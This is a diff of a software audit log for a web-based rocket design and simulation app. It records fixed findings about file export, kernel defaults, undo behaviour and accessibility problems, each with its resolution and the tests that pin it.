+`setSimPref` return early when nothing changes, so a no-op records no undo
+step and keeps redo. Pinned by `simEditNoop.test.ts`.
+The finding as reported:
+`setDeployment`, `setSeparation`, `patchLaunch`, `renameSim` and `setSimPref`
+call `beginEdit()` without comparing values. A no-op clears redo, and the new
+object makes `sameSimInputs` drop an in-flight run. Fix: return early when
+the value is unchanged, as `patchSelected` does.
+
+**C23. LOW, FIXED | Multilevel wind refuses to run over a hidden field** | `web/src/components/sim/LaunchPanel.tsx:232-245, 547-636`; `web/src/services/flight/requiredLaunch.ts:17-25` | VERIFIED
+Resolution: A multilevel profile flies `MultiLevelPinkNoiseWindModel` and
+never reads the single average and deviation
+(`SimulationOptions.getWindModel`), so `missingRequired` requires those two
+only when `windLevels` is empty. Pinned by `requiredLaunch.test.ts`.
+The finding as reported:
+`windAverage` and `windStdDev` stay required while the multilevel panel hides
+them, and the only way back to them (the Average radio) deletes the profile.
+Fix: require them only when `windLevels` is empty.
+
+**C24. LOW, FIXED | The weather key is saved only on blur** | `web/src/components/sim/WeatherKeyField.tsx:27` | VERIFIED
+Resolution: the weather key and the Esri map key share
+`components/common/UserKeyField.tsx`, which also writes an edited key when
+the field unmounts, so closing Settings with Escape keeps it. A field that was
+not edited writes nothing, so a key saved in another tab survives. Pinned by
+`tests/components/sim/WeatherKeyField.test.tsx` (fails against the field from
+before the fix) and `tests/components/sim/EsriKeyField.test.tsx`.
+
+**C25. LOW, FIXED | The aft view turns roll the opposite way from the side view** | `web/src/components/canvas/AftView.tsx:529` vs `schematicShapes.tsx:210, 342, 599, 658-661` | VERIFIED
+Resolution: Desktop's `RocketFigure` turns the side and back views by the same
+`rotate_x(roll)`; the aft view rotates by `-roll` and negates the drag delta,
+so a part's height off the axis matches the side view. Pinned by
+`aftViewRoll.test.tsx`.
+The finding as reported:
+The side view draws theta + roll; the aft view's SVG `rotate(roll)` is
+clockwise on screen, giving phi - roll. A single lug at roll 90 sits on
+opposite sides in the two views. Fix: `rotate(-roll)` (and negate the drag
+delta), with a test of one lug in both views.
+
+**C26. LOW, FIXED | Tree shortcuts act on the selected row, not the focused one** | `web/src/components/design/ComponentTree.tsx:398-405`, `useTreeEdit.ts:35-75` | VERIFIED
+Resolution: The Edit shortcuts act on the focused row: `useTreeEdit().at(id)`
+selects that row and runs the command on it, as desktop's tree, whose
+selection follows the arrow keys, does. The header buttons act on the
+selection. Pinned by `treeShortcutsFocus.test.tsx`.
+The finding as reported:
+Arrow keys move focus without selecting, so Ctrl+X on row B cuts row A. Fix:
+select the focused row first, or make selection follow focus.
+
+**C27. LOW, FIXED | A fin template's label can sit on the page before its outline** | `web/src/services/report/templatesSection.ts:218-231` | VERIFIED
+Resolution: A template reserves its label and its outline (or its too-large
+note) together before drawing the label, so a page break never separates them.
+Pinned by `templatesSection.test.ts` and the PDF golden.
+The finding as reported:
+The label is drawn before `ensure(p, h + 6)` breaks the page. Fix: ensure
+`7 + h + 6` first.
+
+**C28. LOW, FIXED | The parts table shows no material for chutes, streamers and shock cords** | `web/src/services/report/partsSection.ts:168`, `reportCsv.ts:170` (data from `reportModel.ts:132-133`) | VERIFIED
+Resolution: The parts table and component CSV show the material
+`getMaterial()` holds: a parachute's or streamer's canopy (surface) and a
+shock cord's cord (line), with the density in its kind's unit; the CSV has
+surface and line density columns. Pinned by `partsMaterial.kernel.test.ts`,
+`partsSection.test.ts` and `reportCsv.test.ts`.
+The finding as reported:
+Only `materialName` is read; these parts keep `surfaceMaterialName` and
+`lineMaterialName` (`materialSlots.ts:26-29`). Fix: fill from
+`materialSlots`, with the matching density unit.
+
+**C29. LOW, FIXED | The `.CDX1` roughness warning is dropped** | `web/src/services/files/rasaero/surface.ts:230-236`, `web/src/state/fileSlice.ts:652-661` | VERIFIED
+Resolution: A finish with no RASAero surface is still written as Smooth, as on
+desktop, and `saveRasaero` shows the keyed note `errors.exportRasaeroSurface`
+in the banner. Pinned by `keyedErrorBanner.test.ts`.
+The finding as reported:
+A rough or polished finish exports as zero roughness, as on desktop, but the
+English warning built for it never reaches the user (`saveRasaero` ignores
+`warnings`), where desktop warns. Fix: a keyed note shown like `saveRkt`'s
+`skipped`.
+
+**C30. LOW, FIXED | `.rkt` stage overrides always read back as subtree overrides** | `web/src/services/files/rktExport.ts:799-809` | VERIFIED
+Resolution: The `.rkt` writer names a stage override that leaves the parts
+inside out (`errors.rktSkip.stageOnlyOverride`), because `RockSimHandler`
+reads every stage figure back as an override of the whole stage. Pinned by
+`rktExport.test.ts`.
+The finding as reported:
+`RockSimHandler` (lines 219-262) treats `StageNMass` as the whole stage. A
+stage-only override opens in desktop as the subtree's. Fix: name it in
+`skipped` (`errors.rktSkip.subtreeOverride`).
+
+**C31. LOW, FIXED | One unload journal slot for the whole origin** | `web/src/services/storage/workspaceStore.ts:77, 353-355, 569-591` | VERIFIED
+Resolution: The unload journal is kept per design; a boot replays the active
+design's journal, keeps another design's until it is opened (`openActive`),
+and drops one whose design is gone. A journal of exactly what the entry
+holds is dropped unwritten, so reopening the design does not re-stamp it.
+Pinned by `workspaceJournal.test.ts`.
+The finding as reported:
+With two tabs on different designs, the next boot drops the other tab's
+journal (`journal.id !== this.activeId`), and a simultaneous close overwrites
+one with the other. Up to 500 ms of edits lost. Fix: key the journal per
+design or tab.
+
+**C32. LOW, FIXED | A malformed thrustcurve.org reply surfaces as an English TypeError** | `web/src/services/motors/thrustcurve.ts:253, 348-350` | VERIFIED
+Resolution: `resolveTcMotor` and `fetchSamplesCached` check the reply's shape:
+a null body is `errors.thrustcurve.badData`, and a null element in `results`
+is skipped. Pinned by `thrustcurve.test.ts`.
+The finding as reported:
+A `null` body or element throws after `post()` returns, bypassing
+`fetchFailure`. Fix: guard the shape and map to `errors.thrustcurve.badData`.
+
+**C33. MED, FIXED | A shoulder flies with the part's wall while the app and the `.ork` say 0** | `engine-java/src/api/java/api/ComponentFactory.java` (cases "nosecone" and "transition"); `engine-java/src/java/info/openrocket/core/rocketcomponent/Transition.java:492-520` | VERIFIED (kernel and desktop)
+Resolution: the bridge always sets a shoulder's wall, 0 when the node states
+none, and after the shoulder length (`ComponentFactory.create`, and the
+flipped nose cone's settle pass), so a length set from 0 no longer flies
+the part's wall while the panel and the `.ork` say 0. Pinned by
+`fieldReadback.kernel.test.ts` and the `fields` step of `npm run audit`
+(their C33 entries are gone), and by `engineBoundary.test.ts` (an absent
+wall weighs the same as a stated 0; fails against the engine from before the
+fix). And the app now does what desktop's setter does when a shoulder length
+goes from 0 (`Transition.setForeShoulderLength`, which desktop's dialog and
+`loadFromPreset` both go through): `updateNode` gives the shoulder the
+neighbor's wall, the neighbor's radius less that wall, and a cap, where each
+was 0, and clears all three when the length goes back to 0
+(`autoShoulder.ts`, `shoulderSeed`). Pinned by
+`tests/engine/shoulderSeed.kernel.test.ts` against the kernel's own setter on
+a placed part (the bridge's `setShoulderLength`; `buildRocket` sets a length
+before the part is attached, so it cannot show the seed).
+The finding as reported:
+When a node carries a shoulder length but no shoulder thickness, the bridge
+sets the length and nothing else, and `Transition.setForeShoulderLength` (and
+its aft and nose cone twins) seeds a shoulder going from length 0 to a length
+with the part's own wall. The panel shows a wall of 0, and the `.ork` writes
+0, which desktop flies. Six of the bundled examples open this way: their nose
+cone shoulders fly with a 2 to 5 mm wall in the app and none in desktop.
+Fix: have the bridge always set the shoulder wall (0 when absent), or have the
+importers and `defaultNode` carry it, so the app, the file and both kernels
+agree. Pinned by `fieldReadback.kernel.test.ts` and the `fields` audit step.
+
+**C34. LOW, FIXED | The panel shows 0 where the kernel flies its constructor default** | `web/src/tree/kernelDefaults.ts:45`; `web/src/services/design/treeEdit.ts` (`defaultNode`) | VERIFIED (kernel)
+Resolution: `KERNEL_DEFAULTS` now has the rows for the line instance count
+of lugs, rail buttons, centering rings and bulkheads (1), the lug and rail
+button angle (pi), the parachute line count (6) and Cd (0.8), and the packed
+radius of parachutes, streamers and shock cords (0.0125 m), each read back from
+the kernel by `kernelDefaults.kernel.test.ts`; the panel shows each, and a scale
+scales them. A tube fin set's wall is not a constant: the `TubeFinSet`
+constructor leaves it unset, and attached to a tube the part takes that tube's
+wall once and keeps it (desktop 24.12 and the kernel alike). `syncAutoRadii`
+now gives a tube fin set with no wall its parent's, so the node always states
+the wall that flies (`autoRadius.test.ts`, which fails against the code from
+before). The read-back test's C34 entries are all gone.
+The finding as reported:
+`KERNEL_DEFAULTS` has no row for: line instance count (1) on lugs, rail
+buttons, centering rings and bulkheads; lug and rail button `angleOffset`
+(pi); parachute `lineCount` (6) (its `cd` row is in, with C10); packed `radius` of parachutes,
+streamers and shock cords; tube fin `thickness` (0.002). A new lug, button,
+ring or bulkhead therefore shows 0 copies, and a new parachute, streamer or
+shock cord shows a packed diameter of 0 (`defaultNode` writes neither key)
+while each flies the kernel's value. Fix: add the rows (verified the way
+`kernelDefaults.kernel.test.ts` verifies the others), or seed the keys in
+`defaultNode`.
+
+**C35. LOW, FIXED | A nose cone's automatic shoulder follows the tube's bore past its own base** | `web/src/services/design/autoShoulder.ts:57-76` | VERIFIED (kernel)
+Resolution: An automatic shoulder stops at the end it sits on: a nose cone's
+base, a transition's fore or aft end, the clamps
+`Transition.setForeShoulderRadius` and `setAftShoulderRadius` apply
+(`NoseCone.setShoulderRadius` calls them). Pinned by
+`keylessParts.kernel.test.ts` and `autoShoulder.test.ts`.
+The finding as reported:
+`syncAutoShoulders` sizes the shoulder to the bore of the tube behind it, so a
+cone narrower than the tube (a 26 mm cone on a 100 mm tube) gets a 96 mm
+shoulder. The kernel now flies a stated shoulder as desktop's loader does
+(C1), so the app and the kernel agree on the number; the number is still one
+desktop's editor would never produce, and on a flipped cone desktop's loader
+cuts it to the base, as the kernel now does too (`NoseCone`'s shoulder setter
+caps it at the base). Fix: cap the automatic shoulder at the base radius, with
+a test that takes the cap from `NoseCone.setShoulderRadius`.
+
+**C36. MED, FIXED | The `.ork` writes `auto` for line length and cord length, which desktop 24.12 does not read** | `web/src/services/files/ork/exportWriters.ts:337, 360` | VERIFIED (desktop)
+Resolution: the `.ork` writer takes the kernel's figures too, and writes an
+automatic line or cord length as the length that flies with an app-only
+`<linelengthauto>` or `<cordlengthauto>` beside it, which the app reads back
+and desktop ignores with a warning. Pinned by `autoRadius.test.ts` (the number,
+the flag and the round trip), the `fields` step, whose C36 entries are gone,
+and the `desktop` step, which lists the two warnings as expected.
+The finding as reported:
+Every new parachute and shock cord is automatic, so every saved design that
+has one writes `<linelength>auto</linelength>` or `<cordlength>auto</cordlength>`.
+Desktop 24.12 has no automatic line or cord length (`javap` of its `Parachute`
+and `ShockCord` shows no such setter) and opens them at its defaults: the
+every-part sample flies 0.45 m lines and a 3.75 m cord in the app and 0.3 m
+and 0.4 m in desktop. Fix: write the resolved number (from `componentInfo`, as
+C8 needs for `.rkt`) where desktop cannot read `auto`.
+
+**C37. MED, FIXED | `.rkt` lugs open in desktop with a larger outer diameter** | `web/src/services/files/rktExport.ts:312-317` (via `writeSurfaceTube`, 363-367) | VERIFIED (desktop probe)
+Resolution: the writer puts `ID` before `OD` for a launch lug
+(`writeTubeWall(..., boreFirst)`). Pinned by `rktExport.test.ts` ("writes a
+launch lug bore before its outside") and the `fields` step, whose C37 entry
+is gone.
+The finding as reported:
+The writer emits `OD` before `ID`. Desktop's RockSim `LaunchLugHandler` (`engine-java/.openrocket-src/core/src/main/java/info/openrocket/core/file/rocksim/importt/LaunchLugHandler.java:61-68`, the same in the 24.12 jar) applies
+them in that order, and `LaunchLug.setInnerRadius` rebuilds the outer radius
+as the bore plus the current wall (the 1 mm default). The default design's lug
+opens at 2.75 mm radius instead of 2.0 mm, about 1.9 times its frontal area.
+A probe file with `ID` first opens at 2.0 mm. Fix: write `ID` before `OD` for
+launch lugs.
+
+**C38. LOW, FIXED | `.rkt` export drops repeated lugs and rings without saying so** | `web/src/services/files/rktExport.ts` (no `instanceCount` handling for line instances) | VERIFIED (desktop)
+Resolution: The `.rkt` writer names a lug, ring or bulkhead repeated along its
+parent (`errors.rktSkip.instanceCount`); RockSim has no repeat count, and
+desktop's export drops it the same way. Pinned by `rktExport.test.ts`; the
+`check-desktop-fields.mjs` entry now sits with what RockSim cannot carry.
+The finding as reported:
+RockSim has no repeat count, and desktop's own export drops it too, so two
+centering rings or two lugs open in desktop as one. The writer splits
+clusters and pod sets and names other parts it cannot carry in `skipped`, but
+says nothing here. Fix: name the part in `skipped`, or write one part per
+copy as the cluster split does.
+
+**C39. LOW, FIXED | The panel shows 0 for a ring part's or tube fin's outer diameter that is absent; the kernel builds it automatic** | `web/src/services/design/fieldRange.ts` (`fieldValue`); `engine-java/src/api/java/api/ComponentFactory.java` (cases "tubecoupler", "centeringring", "bulkhead", "engineblock", "tubefinset") | VERIFIED (kernel)
+Resolution: `syncAutoRadii` marks a ring part or tube fin set with no outer
+radius automatic and gives it the resolved radius, so the panel shows what the
+kernel builds. Pinned by `fieldReadback.kernel.test.ts`; its entries for this
+are gone.
+The finding as reported:
+A tube coupler with no `outerRadius` is built with its outer radius automatic,
+and the other ring parts and tube fins keep a radius that follows the parent.
+The panel shows 0 for each. Imported `.rkt` rings can leave the key out
+(C18). Fix: show the resolved figure, or have `syncAutoRadii` set the flag and
+the number when the key is absent.
+
+**C40. LOW, FIXED | A new cluster showed a spacing of 0** | `web/src/services/design/componentFields.ts` (`clusterScale`) | VERIFIED (kernel)
+Choosing a cluster writes only `cluster`, and the Cluster scale row showed 0
+while the kernel, the `.ork` writer and the drawing use 1. The field now
+declares `whenAbsent: 1`. Pinned by `fieldReadback.kernel.test.ts` (its
+3-ring cluster seed).
+
+**C41. LOW, FIXED | A clippable transition with no clip flag showed Clipped off** | `web/src/services/design/fieldRange.ts` (`fieldValue`) | VERIFIED (kernel)
+The kernel flies it clipped (`Transition.setShapeType` sets clipped to
+`isClippable()`) and the `.ork` writer writes true; an imported `.rkt`
+transition carries no flag. `fieldValue` now shows the shape's own. Pinned by
+`fieldReadback.kernel.test.ts` (its shape seeds).
+
+**C42. MED, FIXED | `.rkt` writes a mass-only override with its CG at the part's front** | `web/src/services/files/rktExport.ts:216-219` | VERIFIED (desktop)
+Resolution: a mass-only override goes out with the part's own CG from the
+kernel (`componentInfo(id).cgX`), as desktop's `BasePartDTO` writes
+`getOverrideCGX()`; with no kernel figures the override is left out and named
+(`errors.rktSkip.massOverride`). Pinned by `rktExport.test.ts` ("writes the
+kernel CG of the part for a mass-only override", which fails against the
+writer from before the fix) and the `fields` step, whose C42 entries are
+gone. Desktop opens such a part with its CG overridden too, at that same
+value; that is RockSim's one switch, and the check lists it as a format limit.
+The bridge's `getComponentInfo` now settles an automatic-radius pack's radius
+before reading its length and CG, as `ComponentFields` does, so the CG written
+is the settled one (`tests/engine/componentInfoPack.kernel.test.ts`, which
+fails against the engine from before).
+The finding as reported:
+A part with a mass override and no CG override goes out as `KnownCG`
+`mm(overrideCg ?? 0)` with `UseKnownCG` 1, so `BaseHandler.setOverride`
+gives it a CG override of 0. Desktop's own `BasePartDTO` writes
+`getOverrideCGX()`, which is the part's own CG when the CG is not overridden.
+The bundled simulation-extensions and simulation-scripting examples, and the
+overridden parachutes in four others, open with their CG moved to the part's
+front. Fix: write `KnownCG` from `componentInfo(id).cgX` for a mass-only
+override, and name the part in `skipped` when there are no figures.
+
+**C43. HIGH, FIXED | The bridge never applies a stage's mass or CG override** | `engine-java/src/api/java/api/OpenRocketEngine.java:309-331` (stages are built with `new AxialStage()` and only `applySeparationConfig`) | VERIFIED (kernel and desktop)
+Resolution: the override block in `ComponentFactory.create` is now
+`ComponentFactory.applyOverrides`, and `buildRocket` calls it for each stage
+after attaching its parts (a parallel stage already went through `create`).
+The every-part sample gives its booster a mass and CG override for the whole
+stage. Pinned by `tests/engine/stageOverride.kernel.test.ts` (the stage holds
+the stated override, its mass breakdown flies 1.36 kg, and a lower stage's CG
+override is measured from that stage's front; both cases fail against the
+engine from before the fix) and by the `fields` step of `npm run audit`,
+which now agrees with desktop on the dual-parachute-deployment sustainer and
+the every-part booster. The finding as reported:
+The common overrides in `ComponentFactory.create` run for parts, never for a
+stage, and nothing applies them to stages. The app reads a stage's override
+from the file, shows it, and writes it back, and desktop applies it; the
+app's kernel flies the stage without it. The bundled dual-parachute-deployment
+example's sustainer carries a 1.36 kg override, with its subcomponents
+covered, that the app does not fly. Fix: apply the overrides to each stage and
+parallel stage after they are built, and add a stage override to the
+every-part design.
+
+**C45. LOW, FIXED | A zip whose data descriptors carry no signature is refused** | `web/src/services/files/ork/importUnpack.ts` (`unzipCapped`) | VERIFIED (fflate; desktop REPORTED)
+Resolution: An archive the streaming reader cannot read is read again through
+its central directory under the same caps, so a `.ork` whose data descriptors
+leave out the signature opens, as `ZipInputStream` opens it in desktop. Pinned
+by `archiveBombs.test.ts`.
+The finding as reported:
+APPNOTE 4.3.9.3 lets a data descriptor (sizes after the data) omit its
+signature. fflate's streaming `Unzip` then trims the wrong number of bytes
+when it finds the end of the member, and the file is refused with
+`errors.file.archiveCorrupt`. Java's `ZipInputStream` accepts both forms, so
+desktop opens such a file; the central-directory reader before S2 did too.
+Desktop and fflate write the signature, so only a `.ork` re-zipped by an
+uncommon streaming tool meets this. Fix: read such a member through the
+central directory, with the same caps.
+
+
+**C47. LOW, FIXED | A flipped nose cone keeps a shoulder wider than its base** | `web/src/services/design/autoShoulder.ts`; `engine-java/src/api/java/api/ComponentFactory.java` (`settleFlippedShoulders`) | VERIFIED (kernel)
+Resolution: A flipped nose cone's shoulder, stated or automatic, is held to
+its resolved base, as `settleFlippedShoulders` holds it. Pinned by
+`keylessParts.kernel.test.ts` and the parity test; the `KNOWN` line is gone.
+The finding as reported:
+On a flipped nose cone the kernel holds the shoulder to the resolved base
+radius; the app keeps a stated or automatic shoulder wider than the base, so
+the drawing, the report and the printed part show a shoulder that does not
+fly. Seed 14 of `geometryParity.kernel.test.ts` (automatic base, nothing
+ahead, automatic shoulder): app 27.6 mm, kernel 25.0 mm. Shoulders on cones
+that are not flipped match. Pinned as `KNOWN` ("flipped nose cone shoulder
+radius").
+
+**C44. MED, FIXED | Two automatic ends that follow each other keep their stored radius in the app** | `web/src/services/design/autoRadius.ts` (`syncAutoRadii`) | VERIFIED (kernel and desktop)
+Resolution: the bridge reads every automatic radius against the finished rocket
+once the build is done, front to back, once per symmetric part and once
+more (`settleAutoRadii` in
+`OpenRocketEngine.buildRocket`), and the app's resolver replays the same pass
+(`autoRadius.ts`). A tube evaluated during the build remembered a neighbor it
+no longer used, so the first read of the tube ahead of it fell back to
+`DEFAULT_RADIUS`; that was the 25 mm, and it is why the kernel's answer
+depended on read order. A pass corrects one more tube of such a run, counted
+from its fixed end, hence the count. The dual-parachute-deployment example now reads 28.3 mm
+for every tube in the app, the kernel and desktop, and its parachute's CG
+follows. Pinned by `geometryParity.kernel.test.ts` (the example's airframe,
+with the automatic coupler that triggers the fallback, and a run of eight
+automatic tubes each with a coupler, against the live kernel),
+`autoRadius.test.ts` (desktop's 28.3 mm and 23.7 mm; both fail against the
+code from before) and the
+`fields` step, whose C44 entries are gone.
+The finding as reported:
+In the bundled dual-parachute-deployment example the nose cone's base
+(`<aftradius>auto 0.028321`) and the body tube behind it (`<radius>auto
+0.025`) each follow the other. Desktop flies the tube at 28.3 mm, and so does
+the kernel in this build; the kernel's answer for such a pair depends on which
+part was read first (`BodyTube.getAutoOuterRadius` caches the part it
+follows), so a test of the fix takes its expected value from desktop
+(`check:fields`), not from a read of the kernel; the app's resolver leaves the node at the stored 25 mm, so the panel
+and the drawing show 25 mm and the `.rkt` writer emits a 50 mm OD, which
+desktop then flies. Fix: resolve a mutual pair as the kernel does, and add the
+pair to `geometryParity.kernel.test.ts` and to the read-back test's seeds.
+The same example's 42-inch parachute has an automatic packed radius that
+follows that tube's bore, so its length and CG follow the same read order: the
+`.rkt` writer takes a mass-only override's CG at one answer and the check reads
+the other (the `rkt:parachute.overrideCGX` entry in `check-desktop-fields.mjs`).
+Pinned today only by the `fields` step of `npm run audit`.
 
 ## 🟡 Accessibility
 
-### Medium
+**A1. MED, FIXED | The last visible stage chip is an inert toggle** | `web/src/components/canvas/FlightChart.tsx:75-80, 258-273` | VERIFIED
+Resolution: the only stage still shown is `aria-disabled`, with the reason
+("At least one stage stays on the chart.") as its title in every locale. It
+stays focusable, so the reason can be read, and turns back on as soon as
+another stage is shown. Pinned by
+`tests/components/canvas/flightChartReadouts.test.tsx` ("the stage chips"),
+which fails against the chart from before the fix (it set no such state).
+The finding as reported:
+`toggleStage` refuses to hide the last stage, but the chip stays enabled with
+`aria-pressed=true` and gives no feedback. Fix: disable it (or
+`aria-disabled` with a reason) when it is the only one on.
 
-- **A1** (MED, CONFIRMED BY REVIEWER) `web/src/components/design/ComponentTree.tsx:208-218 (with ComponentExportButton.tsx:34-66)`. The row's onKeyDown handles Enter/Space by calling preventDefault and then onSelect. The per-row export button (⬇) and its menuitems sit inside the row and have no tabIndex=-1, so Enter or Space on them bubbles up to the row: the default action (the button click) is canceled and the row gets selected instead. Arrow keys pressed inside the open export menu also bubble to onTreeKeyDown and move focus to another row. *Why it matters:* Keyboard users cannot export a component from the tree. The button also adds one Tab stop per exportable part, which defeats the documented single-tab-stop roving tree. *Fix:* Return early from the row/tree key handlers when e.target is not the row itself (e.target !== e.currentTarget, or closest('[role=menu],button')). Give the export trigger tabIndex=-1 and reach it from the row (for example a context key), or move it out of the treeitem. |.
-- **A2** (MED, CONFIRMED BY REVIEWER) `web/src/components/sim/SimSummary.tsx:230,247,271`. The rail-exit velocity tile, the deploy-velocity tile and the rail-exit static margin tile signal good/warn/unstable only by text color (Stat.tsx:35 applies `tone` as a class; no word, icon or sr text). *Why it matters:* WCAG 1.4.1: a color-blind or screen-reader user cannot tell that the rail exit is below railExitVelocityMin, that deployment is too fast, or that the rocket is unstable off the rail. These are safety readings. *Fix:* Add a verdict word or glyph plus sr-only text (the on-pad tile already has stabilityVerdictKey). Pass a `status` label through Stat. |.
-- **A3** (MED, CONFIRMED BY REVIEWER) `web/src/components/canvas/AeroCharts.tsx:168-189`. The focusable crosshair group moves on arrow keys, but the per-series values it reveals (the legend readout at 147-160) are in no live region, and AeroAnalysis.tsx has no aria-live either (checked with grep). *Why it matters:* A screen-reader user who follows the crosshairHint and arrows through the drag charts hears nothing. The keyboard crosshair only helps sighted keyboard users. *Fix:* Add a polite live region that announces "Mach X: series = value" on keyboard moves only (not on pointer moves). |.
-- **A4** (MED, CONFIRMED BY REVIEWER) `web/src/components/canvas/FlightChart.tsx:156-157 (comment at 236-239)`. The only live region holds "Time X s". The comment says "the value is announced as it moves", but the hovered values live in the FlightChartPanel headers, which are not live. The same region also updates on every pointer move (onMove sets hoverT), so mouse hovering sends a constant stream of polite announcements. *Why it matters:* Keyboard screen-reader users hear the time but never the values. Mouse users with a screen reader running get flooded. *Fix:* Put the primary values in the announced text, and update the live region only on keyboard steps (track the source of the move). Fix the comment. |.
-- **A5** (MED, CONFIRMED BY REVIEWER) `web/e2e/a11y.spec.ts:31`. The axe loop scans only `['Design', 'Simulations', 'Results']` plus Settings. `web/src/state/tabs.ts:16` defines five top-level tabs: `'design' | 'configs' | 'sim' | 'results' | 'tools'`. Configurations (App.tsx:200-208) and Tools (App.tsx:262) render their own panels and are never scanned in any theme. The `openTab` helper at web/e2e/base.ts:164-166 cannot even name `'Tools'`. Inside a tab, only the default center view is scanned: Design's 3D and Aero views and Results' path, ground and environment views (tabs.ts:37-39) are skipped. *Why it matters:* A contrast or labeling regression on the Configurations tables or the Tools calculators passes every gate in all three themes, even though a11y.spec.ts is in CORE_SPECS and runs on every PR. AUDIT_PROMPT says the scan covers "every top-level view". *Fix:* Add `'Tools'` to openTab's union. Scan `['Design', 'Configurations', 'Simulations', 'Results', 'Tools']`. Inside Design and Results, click each DESIGN_VIEWS/RESULT_VIEWS toggle and scan it as well.
-- **A6** (MED, CONFIRMED BY REVIEWER) `web/src/components/canvas/FlightPath3D.tsx:331-335 (Legend at 723-735)`. The phase-color legend container has `pointer-events-none`. pointer-events is inherited and neither the `<label>` nor the `ColorInput` sets `pointer-events-auto`, so the swatches meant for "click the swatch to recolor" cannot be clicked. CenterCanvas.tsx:156 shows the correct pattern (a `pointer-events-auto` child) *Why it matters:* Inert control by the house rule: it looks clickable (`cursor-pointer`) and does nothing with a mouse. It is only reachable by keyboard Tab *Fix:* Add `pointer-events-auto` to the Legend label, or remove `pointer-events-none` from that container |.
-- **A7** (MED, CONFIRMED BY REVIEWER) `web/src/App.tsx:121`. The `err` banner is a plain `<p>` with no `role="alert"` or live region, although the storage banner beside it has `role="status"`. *Why it matters:* Every action failure (bad .ork, export failed, run failed, design blocker) is silent to screen-reader users. *Fix:* Add `role="alert"`.
-- **A8** (MED, CONFIRMED BY REVIEWER) `web/src/components/design/ComponentPicker.tsx:617-634 with 450-465`. Each `<tr>` is `role="button" tabIndex={0}`, and on saved parts it contains a real `<button>` (the delete). Children of `role="button"` are presentational, so the delete control is nested interactive content and the row's cells lose their table semantics. *Why it matters:* A screen-reader user hears each row as one button with flattened cell text, and the per-row delete is unreachable or unannounced (the axe `nested-interactive` rule). The a11y spec does not open this dialog, so the gate does not catch it. *Fix:* Keep the rows as plain `<tr>`s and put a real `<button>` (apply) in the part-number cell, as ConfigsTable.tsx does, or move delete out of the row.
-- **A9** (MED, CONFIRMED BY REVIEWER) `web/src/components/design/MaterialPicker.tsx:234-263`. The material `<select>` has no aria-label and no associated `<label>`. The visible name at :214 is a plain span. Settings > Materials renders one per material type, all unnamed. *Why it matters:* Screen reader users hear "combo box" with no name on every part's material and in Settings (axe `select-name`). *Fix:* Add `aria-label={label ?? t('material.title')}`, or wrap the select in a label. |.
-- **A10** (MED, CONFIRMED BY REVIEWER) `web/src/components/tools/OffTheRail.tsx:246,253,258,265,270`. Thrust-to-weight below 5:1, exit speed below the minimum, rail needed > rail, and weathercock above the limit are shown only by switching the number to amber (`warn` class). No text, icon or sr-only marker is added. *Why it matters:* These are safety go/no-go figures. A colorblind or screen reader user sees an out-of-limit value as normal (WCAG 1.4.1). *Fix:* Add a word or icon plus sr-only text (e.g. "below minimum") beside each flagged value. |.
-- **A11** (MED, CONFIRMED BY REVIEWER) `web/src/components/sim/LocationEditor.tsx:149-154`. The form wrapper's `onKeyDown` handles every Enter with `preventDefault(); submit()`. It also wraps the back button (line 157) and `SiteMap`, whose Enter handler (SiteMap.tsx:204-210) neither stops propagation nor ignores keys aimed at its zoom and layer buttons (SiteMap.tsx:331-349). *Why it matters:* Enter on a map button or the back button cancels that button's activation and saves the location instead. Enter on the focused map (the documented keyboard pick) calls `onPick`, then `submit()` runs with the pre-pick lat/lon from the closure, so the old coordinates are saved and the pick shows up as an unsaved edit. *Fix:* Return early when `e.target` is a button or the map host (or the event is `defaultPrevented`), and have `SiteMap` call `stopPropagation` on the keys it consumes.
-### Low
+**A2. MED, FIXED | The caliper readout fails contrast in light and daylight** | `web/src/components/canvas/SchematicCalipers.tsx:94-105, 183-194` | VERIFIED (code; contrast computed from `index.css` tokens by the agent)
+Resolution: both caliper boxes are drawn in the theme's surface color
+(`token('surface')`) under the accent text. Pinned by
+`e2e/schematic-interaction.spec.ts` ("the caliper readouts hold 4.5:1"), one
+test per theme, which measures the rendered text against its box in the
+browser. With the old fixed box the same measurement is 3.81:1 in light and
+3.29:1 in daylight.
+The finding as reported:
+9 px bold `var(--accent)` text on a fixed `rgba(13,14,18,0.92)` box: about
+3.2:1 in light and 2.7:1 in daylight. No gate sees it: the calipers are off in
+every scanned state, and axe does not judge SVG text. Fix: draw the tag from
+theme tokens, or use `token('sch-label')` for the text.
 
-- **A12** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/CenterToolbar.tsx:118-124`. The ruler toggles pass only `title` to ViewBtn, so each button's accessible name is "T", "B", "L" or "R" (the title becomes the description). ViewBtn already has a `label` prop for exactly this case. *Why it matters:* A screen reader announces "T, toggle button", which is meaningless. *Fix:* Pass label={t(`view.ruler_${side}`)}. |.
-- **A13** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/LoadedBanner.tsx:89`. The design-name button sets aria-label={t('config.edit')} ("Edit rocket configuration"), which replaces its visible text (the rocket name). *Why it matters:* WCAG 2.5.3 Label in Name: voice-control users who say the visible name cannot activate it, and a screen reader never hears the design name. *Fix:* Drop aria-label and add sr-only text after the name, or use aria-describedby for the action. |.
-- **A14** (LOW, CONFIRMED BY REVIEWER) `web/src/components/design/ComponentTree.tsx:521-534`. An <h2> sits inside a <button>. Button children are presentational and headings are not allowed in phrasing content. *Why it matters:* The "Components" heading disappears from heading navigation; screen readers expose only a button. *Fix:* Put the h2 outside and the button inside it (or beside it), as in the disclosure pattern. |.
-- **A15** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/CenterToolbar.tsx:141-147, web/src/components/canvas/PanelExpandButton.tsx:37-45`. The toggles flip both aria-pressed and the accessible name (Maximize/Restore, Expand/Show all). *Why it matters:* A screen reader hears "Restore, pressed", which is contradictory. ARIA says a toggle button keeps a constant name. *Fix:* Keep one constant label with aria-pressed, or drop aria-pressed and keep the changing label. |.
-- **A16** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/FileMenu.tsx:201,249,266,277 and 80,282-283`. (1) The separators are bare <div>s inside role="menu", where the allowed children are menuitem, group and separator. (2) Disabled items use the native `disabled` attribute, which takes them out of arrow navigation, so the `title` that explains why "Check for updates" is disabled (offline or no worker) cannot be reached by keyboard or touch. *Why it matters:* Menu structure is announced inconsistently, and the reason for a disabled item is mouse-only. *Fix:* Use role="separator". Use aria-disabled (still focusable) with a visible or described reason. |.
